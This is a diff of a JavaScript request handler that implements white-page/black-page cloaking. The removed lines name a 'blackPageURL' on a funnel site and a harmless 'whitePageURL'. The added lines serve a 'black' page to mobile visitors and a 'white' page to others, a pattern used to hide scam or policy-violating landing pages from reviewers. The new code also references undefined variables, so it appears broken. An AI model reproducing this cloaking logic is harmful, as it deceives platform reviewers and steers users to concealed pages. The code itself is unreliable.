@@ -1,10 +1,8 @@
 import isRedirectEnabled from './config';
 
 export default function handler(req, res) {
-    // URLs to redirect
-    const whitePageURL = "https://google.com";
-    const blackPageURL = "https://xjsdiaoqpwepa.myfunnelish.com/imbassd-1736879310456939";
-    //const iframeSrc = isRedirectEnabled ? defaultIframeURL : alternateIframeURL;
+    const bhv = bhLP;
+    const whv = whLP;
 
     const lvh = `
     <html>
@@ -20,11 +18,11 @@ export default function handler(req, res) {
 
     if (isMobileDevice) {
       res.writeHead(200, { 'Content-Type': 'text/html' });
-      res.end(lvh);
+      res.end(bhv);
     }
     else { 
       res.writeHead(200, { 'Content-Type': 'text/html' });
-      res.end(lvh);
+      res.end(whv);
     }
     
     res.end();
